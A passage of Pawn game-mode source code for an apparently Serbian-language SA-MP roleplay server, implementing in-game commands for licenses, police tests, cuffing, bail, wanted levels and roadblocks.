			if( strcmp( name, OI[ OrgID ][ oClan10 ], true ) == 0) { strmid( OI[ OrgID ][ oClan10 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan11 ], true ) == 0) { strmid( OI[ OrgID ][ oClan11 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan12 ], true ) == 0) { strmid( OI[ OrgID ][ oClan12 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan13 ], true ) == 0) { strmid( OI[ OrgID ][ oClan13 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan14 ], true ) == 0) { strmid( OI[ OrgID ][ oClan14 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan15 ], true ) == 0) { strmid( OI[ OrgID ][ oClan15 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan16 ], true ) == 0) { strmid( OI[ OrgID ][ oClan16 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan17 ], true ) == 0) { strmid( OI[ OrgID ][ oClan17 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan18 ], true ) == 0) { strmid( OI[ OrgID ][ oClan18 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan19 ], true ) == 0) { strmid( OI[ OrgID ][ oClan19 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan20 ], true ) == 0) { strmid( OI[ OrgID ][ oClan20 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan21 ], true ) == 0) { strmid( OI[ OrgID ][ oClan21 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan22 ], true ) == 0) { strmid( OI[ OrgID ][ oClan22 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan23 ], true ) == 0) { strmid( OI[ OrgID ][ oClan23 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan24 ], true ) == 0) { strmid( OI[ OrgID ][ oClan24 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan25 ], true ) == 0) { strmid( OI[ OrgID ][ oClan25 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan26 ], true ) == 0) { strmid( OI[ OrgID ][ oClan26 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan27 ], true ) == 0) { strmid( OI[ OrgID ][ oClan27 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		 	if( strcmp( name, OI[ OrgID ][ oClan28 ], true ) == 0) { strmid( OI[ OrgID ][ oClan28 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan29 ], true ) == 0) { strmid( OI[ OrgID ][ oClan29 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
			if( strcmp( name, OI[ OrgID ][ oClan30 ], true ) == 0) { strmid( OI[ OrgID ][ oClan30 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }

            OI[ OrgID ][ oUbacenihClanova ]--;

			PlayerInfo[ playerid ][ xSkin ] = SetSexSkin( playerid ); PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
			
			PlayerInfo[ playerid ][ xClan ] = 0;
			PlayerInfo[ playerid ][ xLider ] = 0;
			PlayerInfo[ playerid ][ xSpawn ] = SetRandomSpawn(  );
			PlayerInfo[ playerid ][ xOrgUgovor ] = 0;
			SCM( playerid, -1, "Napustili ste vasu organizaciju!" );
			ResetAllWeapons( playerid ); SaveOrganization( OrgID );
			SavePlayer( playerid );
		}
	}
	else return SendErrorMessage( playerid, "Nisi clan nijedne organizacije");
    return true;
}

CMD:kupidozvoluzaoruzje( playerid, params[] ) {

    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 652.8884,2543.3018,-89.4551 ) ) return SendErrorMessage( playerid, "Morate biti u policijskoj stanici." );
    if(PlayerInfo[playerid][xLevel] < 2) return SendErrorMessage(playerid, "Morate imati level 2+!");
    if( PlayerInfo[ playerid ][ xNovac ] < 10000 ) return SendErrorMessage( playerid, "Nemate kod sebe 10.000$." );
    if( PlayerInfo[ playerid ][ xGunLicense ] == true ) return SendErrorMessage( playerid, "Vec imas dozvolu za oruzje. " );

	PlayerInfo[ playerid ][ xGunLicense ] = true;
	DajIgracuNovac( playerid, -10000 );
	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
    SendInfoMessage( playerid, "Kupili ste dozvolu za oruzje za 10.000$." );
    SavePlayer( playerid );

    new string1[ 128 ];
	format( string1, sizeof( string1 ), "Igrac %s je kupio dozvolu za oruzje", ImeIgraca( playerid ) );
	LogSave( "Ostalo/LogGiveGunLicense.log", string1 );
	return true;
}

CMD:kupidozvoluzaavion( playerid, params[] ) {

    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 828.0190,-516.6453,996.6475 ) ) return SendErrorMessage( playerid, "Morate biti u auto skoli." );
    if( PlayerInfo[ playerid ][ xNovac ] < 10000 ) return SendErrorMessage( playerid, "Nemate kod sebe 10.000$." );
    if( PlayerInfo[ playerid ][ xLetelica ] > 0 ) return SendErrorMessage( playerid, "Vec imas dozvolu za avion. " );

	PlayerInfo[ playerid ][ xLetelica ] = 1;
	DajIgracuNovac( playerid, -10000 );
	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
    SendInfoMessage( playerid, "Kupili ste dozvolu za avion za 10.000$." );
    SavePlayer( playerid );
	return true;
}

CMD:kupidozvoluzabrod( playerid, params[] ) {

    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 828.0190,-516.6453,996.6475 ) ) return SendErrorMessage( playerid, "Morate biti u auto skoli." );
    if( PlayerInfo[ playerid ][ xNovac ] < 10000 ) return SendErrorMessage( playerid, "Nemate kod sebe 10.000$." );
    if( PlayerInfo[ playerid ][ xBrodska ] > 0 ) return SendErrorMessage( playerid, "Vec imas dozvolu za brod. " );

	PlayerInfo[ playerid ][ xBrodska ] = 1;
	DajIgracuNovac( playerid, -10000 );
	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
    SendInfoMessage( playerid, "Kupili ste dozvolu za avion za 10.000$." );
    SavePlayer( playerid );
	return true;
}

CMD:alcotest( playerid, params[ ], help ) {
	new igrac;
    if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/alcotest [ ID/Deo imena ]" );
	if( !IsPlayerConnected( igrac ) || igrac == INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Krivi ID!" );
	if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi dati test alkoholiziranost!" );
	if( !IsPlayerNearPlayer( 5.0, playerid, igrac ) ) return SendErrorMessage( playerid, "Niste blizu igraca kojem zelite dati alcotest!" );
    new alcohol = GetPlayerDrunkLevel( igrac ),
		Float:promils = alcohol / 1000.0;

	SendClientMessageEx( playerid, BELA, "%s je ispuhao %.2f promila.", ImeIgraca( igrac ), promils );

	SendClientMessageEx( igrac, BELA, "Ispuhali ste %.2f promila.", promils );

	format( globalstring, sizeof( globalstring ), "* Policajac %s daje test alkoholizma %s.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
	PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
	return true;
}

CMD:narcotest( playerid, params[ ], help ) {
	new igrac;
	if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if( sscanf( params, "u", igrac ) ) {
		SendUsageMessage( playerid, "/narcotest [ ID/Deo Imena ]");
		return 1;
    }
	if( IsPlayerConnected( igrac ) ) {
	    if( igrac != INVALID_PLAYER_ID ) {
            if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi dati narco test!" );
	        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
				if( PlayerStoned[ igrac ] == true ) {
					SetPVarInt( igrac, "NarkoTest", 1 );
					SetPVarInt( playerid, "PlayerHasTest", igrac );
					format( globalstring, sizeof( globalstring ), "Izvrsili ste narkotest nad %s, odnesite uzorak u bolnicu na provjeru.", ImeIgraca( igrac ) );
					SCM( playerid, BELA, globalstring );
				} else {
				    SetPVarInt( igrac, "NarkoTest", 0 );
				    SetPVarInt( playerid, "PlayerHasTest", igrac );
				    format( globalstring, sizeof( globalstring ), "Izvrsili ste narkotest nad %s, odnesite uzorak u bolnicu na provjeru.", ImeIgraca( igrac ) );
					SCM( playerid, BELA, globalstring );
				}
			} else SendErrorMessage( playerid, "Taj igrac nije dovoljno blizu vas.");
		}
	}
	return 1;
}

CMD:narcoresults( playerid, params[ ], help ) {
	new igrac;
	if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu(SAMO PD/SWAT/FBI)" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	if( sscanf( params, "u", igrac ) ) {
		SendUsageMessage( playerid, "/narcoresults [ ID/Deo Imena ]");
		return 1;
    }
	if( IsPlayerConnected( igrac ) ) {
	    if( igrac != INVALID_PLAYER_ID ) {
			if( IsPlayerInRangeOfPoint( playerid, 3.0, -2292.2214, 104.6003, -5.3468 ) ) {
			    if( GetPVarInt( playerid, "PlayerHasTest" )  != 999 ) {
					if( GetPVarInt( playerid, "PlayerHasTest")  == igrac ) {
					    if( GetPVarInt( igrac, "NarkoTest") == 1 ) {
                            SendInfoMessage( playerid, "Narkotest izvrsen nad %s je pozitivan.", ImeIgraca( igrac ) );
						} else {
						    SendInfoMessage( playerid, "Narkotest izvrsen nad %s je negativan.", ImeIgraca( igrac ) );
					    }
					    SetPVarInt( playerid, "PlayerHasTest", 999 );
					    SetPVarInt( igrac, "NarkoTest", 0 );
					} else SendErrorMessage( playerid, "Nemate uzorak od tog igraca kod sebe.");
				} else SendErrorMessage( playerid, "Nemate nijedan uzorak kod sebe.");
			} else SendErrorMessage( playerid, "Morate biti kod bolnice da bi ste mogli uzeti uzorak narkotesta.");
		}
	}
	return 1;
}

CMD:zatvorenici( playerid, params[] ) {
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	SCM( playerid, BELA, "|_______-=Popis svih zatvorenika=-________|");
   	foreach( Player, i)
	{
		if( IsPlayerConnected(i))
		{
  			if( PlayerInfo[ i ][ xZatvor ] == OBICAN_ZATVOR )
		   	{
				format( globalstring, sizeof( globalstring ), "%s", ImeIgraca( i ) );
				SCM( playerid, SVETLOPLAVA, globalstring);
			}
		}
	}
    return 1;
}

CMD:platikauciju( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xZatvor ] == OBICAN_ZATVOR ) {
	    if( PlayerInfo[ playerid ][ xBailPrice ] > 0 ) {
	        if( PlayerInfo[ playerid ][ xNovac ] >= PlayerInfo[ playerid ][ xBailPrice ] ) {
				SendClientMessageEx( playerid, SVETLOPLAVA, "Izbavili ste sebe za: $%d", PlayerInfo[ playerid ][ xBailPrice ] );
				DajIgracuNovac( playerid, -PlayerInfo[ playerid ][ xBailPrice ] );
				PlayerInfo[ playerid ][ xBailPrice ] = 0;
				Novi_SetPlayerPos( playerid, 1798.0217,-1578.1200,14.0855);
                SetPlayerWorldBounds( playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
			    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
			   	SetCameraBehindPlayer( playerid );
			    TogglePlayerControllable( playerid, false );
			   	SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );
		    	PlayerInfo[ playerid ][ xZatvor ] = 0; PlayerInfo[ playerid ][ xZatvorVreme ] = 0;
		    	SendInfoMessage( playerid, "Platili ste svoj dug drustvu.");
		    	GameTextForPlayer( playerid, "~g~Sloboda~n~~w~Pokusajte biti bolji gradjanin", 5000, 1);
	        } else SendErrorMessage( playerid, "Nemate dovoljno novca za kauciju !");
	    } else SendErrorMessage( playerid, "Nemate kauciju !");
	} else SendErrorMessage( playerid, "Niste pritvoreni !");
	return 1;
}

CMD:tazer( playerid, params[] ) {
	new weapon, ammo;
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage(playerid, "Ne mozete koristiti ovu komandu trenutno.");
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	if( ImaTazer[ playerid ] == false ) {
	    if( TazerMetkovi[ playerid ] == 0 ) return SendErrorMessage( playerid, "Nemate vise metkova tazera." );
	    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	    GetPlayerWeaponData( playerid, 2, weapon, ammo );
	    lastweapon[ playerid ][ 0 ] = weapon;
	    lastweapon[ playerid ][ 1 ] = ammo;
	    GiveWeaponToPlayer( playerid, 23, TazerMetkovi[ playerid ] );
       	ImaTazer[ playerid ] = true;
		SCM( playerid, BELA, "Izvadio si tazer iz futrole." );
	}
	else if( ImaTazer[ playerid ] == true ) {
	    GetPlayerWeaponData( playerid, 2, weapon, ammo );
	    TazerMetkovi[ playerid ] = ammo;
	    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
       	RemovePlayerWeapon( playerid, 23 );
		GiveWeaponToPlayer( playerid, lastweapon[ playerid ][ 0 ], lastweapon[ playerid ][ 1 ] );
       	ImaTazer[ playerid ] = false;
		SCM( playerid, BELA, "Vratio si tazer u futrolu." );
	}
	return true;
}

CMD:cuff( playerid, params[] ) {
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	new igrac;
    if( BrojLisica[ playerid ] == 0  ) return SendErrorMessage( playerid, "Nemate nijedan par lisica." );
	if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/cuff [ ID/Deo imena ]");
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if( IsPlayerConnected( igrac ) ) {
		if( igrac != INVALID_PLAYER_ID ) {
	    	if( OI[ PlayerInfo[ igrac ][ xClan ] ][ oTip ] == ORG_TIP_PD ) return SendErrorMessage( playerid, "Ne mozes staviti lisice na policajca !");
			if( IsPlayerNearPlayer(5.0, playerid, igrac )  && !IsPlayerInAnyVehicle( playerid ) && !IsPlayerInAnyVehicle( igrac ) ) {
				if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi stavit lisice!");
				if( PlayerCuffed[ igrac ] == 1 ) {
					SendClientMessageEx( igrac, SVETLOPLAVA, "* Stavio vam je lisice %s.", ImeIgraca( playerid ) );
				    SendClientMessageEx( playerid, SVETLOPLAVA, "* Stavio si lisice na %s.", ImeIgraca( igrac ) );
				    format( globalstring, sizeof( globalstring ), "* %s stavlja lisice na %s, tako da mu nebi pobjegao.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
				    PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
				    GameTextForPlayer( igrac, "~r~Uhapsen", 2500, 3);
				    TogglePlayerControllable( igrac, 0 );
				    SetPlayerAttachedObject( igrac, OBJECT_SLOT_RHAND, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000 );
					SetPlayerSpecialAction( igrac, SPECIAL_ACTION_CUFFED );
					PlayerCuffed[ igrac ] = 2;
					BrojLisica[ playerid ]--;
					
				} else SendErrorMessage( playerid, "Taj igrac nije sokiran !");
			} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije online !");
    return 1;
}

CMD:uncuff( playerid, params[] ) {
	if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	new igrac;
	if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/uncuff [ ID/Deo imena ]");
	if( IsPlayerConnected( igrac ) ) {
		if( igrac != INVALID_PLAYER_ID ) {
		    if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
			    if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes skiniti lisice sam sebi!");
				if( PlayerCuffed[ igrac ] == 2 ) {
					SendClientMessageEx( igrac, SVETLOPLAVA, "* Skinio vam je lisice  %s.", ImeIgraca( playerid ) );
					SendClientMessageEx( playerid, SVETLOPLAVA, "* Skinili ste lisice sa %s.", ImeIgraca( igrac ) );
					GameTextForPlayer( igrac, "~g~Slobodan", 2500, 3);
					TogglePlayerControllable( igrac, 1 );
					ClearAnimations( igrac );
					if( IsPlayerAttachedObjectSlotUsed( igrac, OBJECT_SLOT_RHAND ) ) RemovePlayerAttachedObject( igrac, OBJECT_SLOT_RHAND );
					SetPlayerSpecialAction( igrac, SPECIAL_ACTION_NONE );
					PlayerCuffed[ igrac ] = 0;
					if(GetPVarInt( igrac, "CuffTimerCalled") == 1 ) {
						Novi_KillTimer( TazerTimer[ playerid ] );
						SetPVarInt( igrac, "CuffTimerCalled", 0 );
					}
				} else SendErrorMessage( playerid, "Taj igrac nije zavezan !");
			} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije online !");
	return 1;
}

CMD:kpu( playerid, params[] ) {
	new igrac, sediste;
	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u autu !");
	if( sscanf( params, "ui", igrac, sediste ) ) return SendUsageMessage( playerid, "/kpu [ ID/Deo imena ] [ ID sedista ]");
	if( IsPlayerConnected( igrac ) ) {
		if( igrac != INVALID_PLAYER_ID ) {
		    if( KnockedDown[ igrac ] != true ) return SendErrorMessage( playerid, "Moras prvo da oboris igraca.(/knockout)." );
  			if( sediste < 1 || sediste > 3 ) return SendErrorMessage( playerid, "ID sedista ne moze biti veci od 3 ili manji od 1.");
		    if( OI[ PlayerInfo[ igrac ][ xClan ] ][ oTip ] == ORG_TIP_PD ) return SendErrorMessage( playerid, "Ne mozes staviti policajca u auto !");
		    if( IsPlayerInAnyVehicle( igrac ) ) return SendErrorMessage( playerid, "Osumnjiceni je u vozilu, izbaci ga iz vozila prvo !");
			if( IsPlayerNearPlayer( 8.0, playerid, igrac ) ) {
				if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes ubaciti sam sebe!");
				new carid = GetPlayerVehicleID( playerid );
           		new Float:pos[ 6 ];
           		GetPlayerPos( playerid, pos[0], pos[1], pos[2] );
            	GetPlayerPos( igrac, pos[ 3 ], pos[4], pos[5] );
           		GetVehiclePos( carid, pos[0], pos[1], pos[2] );
            	if( floatcmp( floatabs( floatsub( pos[0], pos[ 3 ] ) ), 10.0 ) != -1 &&
          		floatcmp( floatabs( floatsub( pos[1], pos[4] ) ), 10.0 ) != -1 &&
           	 	floatcmp( floatabs( floatsub( pos[2], pos[5] ) ), 10.0 ) != -1 ) return false;
				SendClientMessageEx( igrac, SVETLOPLAVA, "* Ubacen si u vozilo od strane %s .", ImeIgraca( playerid ) );
				SendClientMessageEx( playerid, SVETLOPLAVA, "* Ubacio si u vozilo %s .", ImeIgraca( igrac ) );
				format( globalstring, sizeof( globalstring ), "* %s ubacuje %s u vozilo.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
				PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
				ClearAnimations( igrac );
				TogglePlayerControllable( igrac, 0 );
				Novi_PutPlayerInVehicle( igrac, carid, sediste );
			} else SendErrorMessage( playerid, "Predaleko si od osumnjicenog!");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije online !");
	return 1;
}

CMD:pu( playerid, params[] ) {
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	new igrac, sediste;
	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u autu !");
	if( sscanf(params, "ui", igrac, sediste ) ) return SendUsageMessage( playerid, "/pu [ ID/Deo imena ] [ ID sedista ]");
	if( IsPlayerConnected( igrac ) ) {
		if( igrac != INVALID_PLAYER_ID ) {
  			if( sediste < 1 || sediste > 3 ) return SendErrorMessage( playerid, "ID sedista ne moze biti veci od 3 ili manji od 1.");
		    if( OI[ PlayerInfo[ igrac ][ xClan ] ][ oTip ] == ORG_TIP_PD ) return SendErrorMessage( playerid, "Ne mozes staviti policajca u auto !");
		    if( IsPlayerInAnyVehicle( igrac ) ) return SendErrorMessage( playerid, "Osumnjiceni je u vozilu, izbaci ga iz vozila prvo !");
			if( IsPlayerNearPlayer( 8.0, playerid, igrac ) ) {
				if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes ubaciti sam sebe!");
				if( PlayerCuffed[ igrac ] == 2 ) {
					new carid = GetPlayerVehicleID( playerid );
           			new Float:pos[6];
           			GetPlayerPos( playerid, pos[0], pos[1], pos[2] );
            		GetPlayerPos( igrac, pos[ 3 ], pos[4], pos[5] );
            		GetVehiclePos( carid, pos[0], pos[1], pos[2] );
            		if( floatcmp( floatabs( floatsub( pos[0], pos[ 3 ] ) ), 10.0 ) != -1 &&
          			floatcmp( floatabs( floatsub( pos[1], pos[4] ) ), 10.0 ) != -1 &&
           		 	floatcmp( floatabs( floatsub( pos[2], pos[5] ) ), 10.0 ) != -1 ) return false;
					SendClientMessageEx( igrac, SVETLOPLAVA, "* Ubacen si u vozilo od strane %s .", ImeIgraca( playerid ) );
					SendClientMessageEx( playerid, SVETLOPLAVA, "* Ubacio si u vozilo %s .", ImeIgraca( igrac ) );
					format( globalstring, sizeof( globalstring ), "* %s ubacuje %s u vozilo.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
					PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
					ClearAnimations( igrac );
					TogglePlayerControllable( igrac, 0 );
					Novi_PutPlayerInVehicle( igrac, carid, sediste );
		 		} else SendErrorMessage( playerid, "Taj igrac nije uhapsen !");
			} else SCM( playerid, CRVENA, "Predaleko si od osumnjicenog!");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije online !");
	return 1;
}

CMD:m(playerid, params[]) {

    new id;
    if(GetFactionType(playerid) != ORG_TIP_PD) return SendErrorMessage(playerid, "Niste u mogucnosti koristiti ovu komandu");
    if(!PoliceDuty[playerid]) return SendErrorMessage(playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/m [ ID ]");
    if(!IsPlayerConnected(id)) return SendErrorMessage( playerid, "Taj igrac je offline!");
    if(id == playerid) return SendErrorMessage( playerid, "Ne mozete sebi!");
    if(GetFactionType(id) == ORG_TIP_PD) return SendErrorMessage( playerid, "Ne mozes to policajcu.");

    GameTextForPlayer(id, "~r~STOP ~b~POLICIJA", 4000, 0);

    return 1;
}


// CMD:m( playerid, params[] ) {
// 	if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
// 	if( isnull( params ) ) return SendUsageMessage( playerid, "(/m)egaphone [megaphone chat] ");
// 	if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
//     if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

// 	if( Maskuse[ playerid ] == false )
// 		format( globalstring, sizeof( globalstring ), "[Policajac %s:o< %s]", ImeIgraca( playerid ), params );
// 	else
// 	    format( globalstring, sizeof( globalstring ), "[Policajac Maska_%d:o< %s]", PlayerInfo[ playerid ][ xMaskID ], params );

// 	foreach( Player, i ) {
// 	    if( IsPlayerNearPlayer( 60.0, playerid, i ) ) {
// 	        SCM( i, ZUTA, globalstring );
// 	    }
// 	}
// 	return 1;
// }

CMD:wanted( playerid, params[] ) {
    if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	strcat( DialogStrgEx, "|_______-=Popis svih osumnjicenih=-________|\n" );
    foreach( Player, i )
	{
		if( IsPlayerConnected( i ) )
		{
	  		if( PlayerInfo[ i ][ xWanted ] > 0 )
		 	{
				format( globalstring, sizeof( globalstring ), "- %s | Wanted Level: %d\n", ImeIgraca( i ), PlayerInfo[ i ][ xWanted ] );
				strcat( DialogStrgEx, globalstring );
			}
		}
	}
	ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	return 1;
}

CMD:su( playerid, params[] ) {
	new id, tekst[ 64 ], wanted;
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if( sscanf( params, "uis[64]", id, wanted, tekst ) ) return SendUsageMessage( playerid, "/su [ ID/Deo imena ] [ Broj Wanteda ] [ Razlog ]");
    if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Taj igrac je offline!");
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozete sebi dati wanted level!");
    if( OI[ PlayerInfo[ id ][ xClan ] ][ oTip ] == ORG_TIP_PD ) return SendErrorMessage( playerid, "Ne mozes dati wl policajcu.");
	PostaviWanted( id, tekst, ImeIgraca( playerid ), wanted );
	format( globalstring, sizeof( globalstring ), "WANTED | %s je dao %d wanteda igracu %s Razlog: %s", ImeIgraca( playerid ), wanted, ImeIgraca( id ), tekst );
	AdminPoruka( NARACRVENA, globalstring );
	new string[128];
	format( string, sizeof( string ), "* Policajac je prijavio kriminalca %s.Imate 5 minuta da ga uhvatite!", ImeIgraca( id ) );
	SetPlayerColor(id, 0xAA333300);
	foreach( Player, i ) {
		if( IsPlayerConnected( i ) ) {
			if( OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_PD ) {
				SCM( i, 0x8D8DFF00, string );
			}
		}
	}
	return true;
}

CMD:rb( playerid, params[] ) {
    new Float:plocx,Float:plocy,Float:plocz,Float:ploca, rb;
    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
 	    if( PlayerInfo[ playerid ][ xRank ] >= 3 ) {
	        if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
		    if( sscanf( params, "i", rb))
	        {
		        SendUsageMessage( playerid, "/roadblock(/rb) [Roadblock ID]");
				SCM( playerid, SVETLOPLAVA, "Dostupne blokade:");
				SCM( playerid, 0xB4B5B7FF, "| 1: Mala blokada");
				SCM( playerid, 0xB4B5B7FF, "| 2: Velika blokada");
				SCM( playerid, 0xB4B5B7FF, "| 3: Cunj");
				SCM( playerid, 0xB4B5B7FF, "| 4: Znak usmjeravanja");
				SCM( playerid, 0xB4B5B7FF, "| 5: Znak upozorenja");
				SCM( playerid, 0xB4B5B7FF, "| 6: Blokada usmjeravanja");
				return 1;
			}
        	if(rb == 1)
			{
				PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
	        	GetPlayerPos( playerid, plocx, plocy, plocz);
	        	GetPlayerFacingAngle( playerid,ploca);
	        	CreateRoadblock(1459,plocx,plocy,plocz,ploca);
	        	GameTextForPlayer( playerid,"~w~Mala blokada ~b~postavljena!",3000,1);
				return 1;
			}
			else if(rb == 2)
			{
				PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		        GetPlayerPos( playerid, plocx, plocy, plocz);
		        GetPlayerFacingAngle( playerid,ploca);
		        CreateRoadblock(978,plocx,plocy,plocz+0.6,ploca);
		        GameTextForPlayer( playerid,"~w~Velika blokada ~b~postavljena!",3000,1);
				return 1;
			}
			else if(rb == 3)
			{
				PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		        GetPlayerPos( playerid, plocx, plocy, plocz);
		        GetPlayerFacingAngle( playerid,ploca);
		        CreateRoadblock(1238,plocx,plocy,plocz+0.2,ploca);
		        GameTextForPlayer( playerid,"~w~Cunj ~g~postavljen!",3000,1);
				return 1;
			}
			else if(rb == 4)
			{
